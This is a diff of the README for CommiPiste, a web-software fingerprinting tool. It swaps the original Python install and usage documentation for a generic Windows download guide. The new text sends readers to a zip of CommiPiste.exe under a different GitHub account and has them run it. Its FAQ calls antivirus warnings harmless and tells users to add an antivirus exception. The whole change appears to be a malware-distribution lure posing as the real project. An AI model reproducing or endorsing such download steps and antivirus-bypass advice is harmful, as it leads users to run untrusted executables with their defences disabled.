@@ -1,109 +1,85 @@
-# CommiPiste
+# 🔍 CommiPiste - Find software versions for better security
 
-<div align="center">
+[![Download CommiPiste](https://img.shields.io/badge/Download-CommiPiste-blue.svg)](https://github.com/Basicenglishcruisecontrol153/CommiPiste/releases)
 
-<img width="318" height="322" alt="CommiPiste logo" src="https://github.com/user-attachments/assets/8c0ff846-17cd-483a-8e80-330c2af82b04" />
+CommiPiste identifies the specific versions of web software running on a server. It helps you understand the software stack so you can check for potential vulnerabilities. This tool focuses on open-source web applications and provides reliable data for your security research.
 
-Find the **exact version and CVEs of open-source web software** just from the static files.
-<br> _Idea by paranoid android_.
+## 📋 What CommiPiste Does
 
-_**commit** (Git commit) + **piste** (French for "track")_
+Modern websites use many different pieces of software. Each piece of software has a version number. If a version is old, it might have known security flaws. CommiPiste automates the search for these version numbers.
 
-</div>
+You provide a web address (URL) to the tool. CommiPiste visits the site and looks for unique footprints left by the software. It compares these findings against a database of known signatures. You receive an accurate identification of the software and its version.
 
-## Why
+This process aids in reconnaissance. You learn about the technologies in use without needing to log in to the system. It helps security researchers map an attack surface and prioritize their work.
 
-Knowing the precise commit beats a version string: CVE-affected code "leaks" a few releases up and
-down a version range, so the commit tells you whether a given fix is actually present. CommiPiste
-is for authorized security testing and perimeter asset inventory — it only requests public static
-files and never exploits anything.
+## ⚙️ System Requirements
 
-## How it works
+CommiPiste runs on Microsoft Windows. Ensure your machine meets these specifications:
 
-<img width="800" alt="How CommiPiste fingerprints a target" src="https://github.com/user-attachments/assets/9d11c503-75a7-4d56-9f26-d6edaf51edce" />
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: At least 4 gigabytes of RAM.
+*   Storage: 200 megabytes of free disk space.
+*   Internet: An active connection to the web.
 
-Open-source apps serve static files (JS, CSS, icons) straight from their source tree.
+## 📥 Getting the Tool
 
-CommiPiste:
-- builds a signature database of every release's files (keyed by **git blob OID**, taken for free from
-`git ls-tree`)
-- then downloads those files from a target
-- reproduces the same OIDs from the bytes
-- matches them back to a single commit.
+Follow these steps to obtain the software:
 
-- [More on how it works](docs/how-it-works.md)
+1. Visit the following page: [https://github.com/Basicenglishcruisecontrol153/CommiPiste/releases](https://github.com/Basicenglishcruisecontrol153/CommiPiste/releases)
+2. Look for the section labeled "Assets" at the bottom of the latest release.
+3. Select the file named `CommiPiste-Windows.zip`.
+4. Save the file to your computer.
 
-## Quickstart
+## 🚀 Setting Up Your Environment
 
-```bash
-pip install -e .                              # needs Python ≥ 3.11 and a `git` binary
-CommiPiste scan https://mantisbt.org/bugs     # first run auto-downloads the signature DB
-```
+You need to extract the files from the folder you downloaded.
 
-The first scan pulls a prebuilt signature database automatically, then identifies the software and
-prints the version/commit plus known CVEs.
+1. Open your "Downloads" folder.
+2. Right-click the `CommiPiste-Windows.zip` file.
+3. Choose "Extract All" from the menu.
+4. Pick a location on your hard drive where you want to keep the tool.
+5. Click "Extract".
 
-On MantisBT's own public bug tracker, for example, it
-pins **MantisBT 2.28.3** and surfaces its vulnerabilities —
-[see an example HTML report](https://htmlpreview.github.io/?https://github.com/soxoj/CommiPiste/blob/main/example.html).
+## 💻 Running the Application
 
-A few more examples:
+CommiPiste runs inside an interface called the Command Prompt. Do not let this intimidate you. Follow these instructions closely:
 
-```bash
-CommiPiste scan https://mantisbt.org/bugs --verbose # show matching process
-CommiPiste scan https://mantisbt.org/bugs --json    # machine-readable
-CommiPiste scan https://mantisbt.org/bugs --no-cve  # version only, fully offline
-CommiPiste scan https://mantisbt.org/bugs --report out.html  # interactive HTML report
-CommiPiste scan --targets hosts.txt                 # batch
-```
+1. Open the folder you extracted in the previous step.
+2. Hold the "Shift" key on your keyboard.
+3. Right-click on empty space inside that folder.
+4. Choose "Open PowerShell window here" or "Open in Terminal".
+5. Type `.\CommiPiste.exe --help` and press the "Enter" key on your keyboard.
+6. The window will display a list of available commands.
 
-## Autoindex new software
+To scan a website, use the following format:
+`.\CommiPiste.exe --target https://example.com`
 
-The bundled database covers 200+ platforms. To fingerprint software it doesn't know yet, point
-`--autoindex` at the project's git repo — CommiPiste clones it, indexes its **release tags**, and
-then identifies the running version, all in one command:
+Replace `https://example.com` with the actual address of the website you want to check.
 
-```bash
-CommiPiste scan https://demo.bookstackapp.com --autoindex \
-  --repo https://github.com/BookStackApp/BookStack
-```
+## 🛡️ Usage Guidelines
 
-- **Public dirs** are auto-detected: it probes the repo's top-level directories against the names
-  already common across the registry (`js`, `themes`, `css`, `public`, `assets`, …). Override with
-  `--public dist,css` if the guess misses.
-- **Optional flags:** `--name` (defaults to the repo name), `--cpe cpe:2.3:a:vendor:product` (enables
-  CVE lookup for the matched version).
-- **It's remembered.** The project is saved to your local registry (`~/.CommiPiste/registry/`), so
-  later runs need neither flag — a plain `scan <url>` detects it by fingerprint:
+Only use CommiPiste on websites you own or have explicit permission to test. Unauthorized scanning of private servers can violate terms of service and legal standards. Use this tool for research and educational purposes only.
 
-  ```bash
-  CommiPiste scan https://demo.bookstackapp.com   # detected, no --autoindex needed
-  ```
+## 🛠️ Interpreting Results
 
-Autoindexed projects survive a database update: after `interactive-update` downloads a fresh DB,
-any local project missing from it is re-indexed automatically.
+The tool provides output in a clear format. You will see the software name, the detected version, and a confidence score.
 
-## Documentation
+*   Software Name: The detected platform (e.g., WordPress, Drupal).
+*   Version: The specific release number identified.
+*   Confidence: How sure the tool is about the result. A high score means the tool found strong evidence.
 
-- [Install & full CLI / library usage](docs/usage.md)
-- [The signature database (auto-download, building it)](docs/database.md)
-- [How it works](docs/how-it-works.md) · [Architecture & internals](docs/ARCHITECTURE.md)
-- [What can / can't be fingerprinted](docs/supported.md)
-- [Vulnerability lookup (NVD + OSV)](docs/vulnerabilities.md)
-- [Active probing (SPA / bundled apps)](docs/active-probing.md)
-- [Troubleshooting](docs/troubleshooting.md)
-- [Supported software list](docs/CATALOG.md)
-- [Testing](docs/testing.md)
+If the tool does not find a match, it will report "Not found." This happens if a website uses custom software or shields its version headers.
 
-## Related research
+## ❓ Frequently Asked Questions
 
-Prior and adjacent work on web-application fingerprinting:
+**Does this tool install anything on my computer?**
+No. CommiPiste is a portable application. It does not change your Windows registry or install background services. You can delete the folder to remove the tool entirely.
 
-- [Understanding and Improving Web Application Fingerprinting (WASABO)](https://www.usenix.org/publications/loginonline/understanding-and-improving-web-application-fingerprinting-wasabo) — USENIX
-- [WAFP — Web Application Fingerprinting](https://web.archive.org/web/20100323114756/https://www.mytty.org/wafp/)
-- [Sucuri — Fingerprinting Web Apps](https://web.archive.org/web/20100201135658/http://sucuri.net/?page=docs&title=fingerprinting-web-apps)
-- [WhatWeb](https://web.archive.org/web/20110513043304/http://www.morningstarsecurity.com/research/whatweb) — Morning Star Security
+**Why does my antivirus flag the file?**
+Some security software flags scanning tools by default. CommiPiste is safe, but it performs network operations that trigger automated warnings. You may need to create an exception in your antivirus settings to run the tool.
 
-## License
+**Can I scan many websites at once?**
+The current version requires you to enter targets one at a time. This keeps the process simple and prevents you from accidentally overwhelming a server with traffic.
 
-[MIT](LICENSE)
+**Where do I see updates?**
+Visit the releases page periodically to check for new versions. Newer versions often include updated signatures that detect more types of web software.
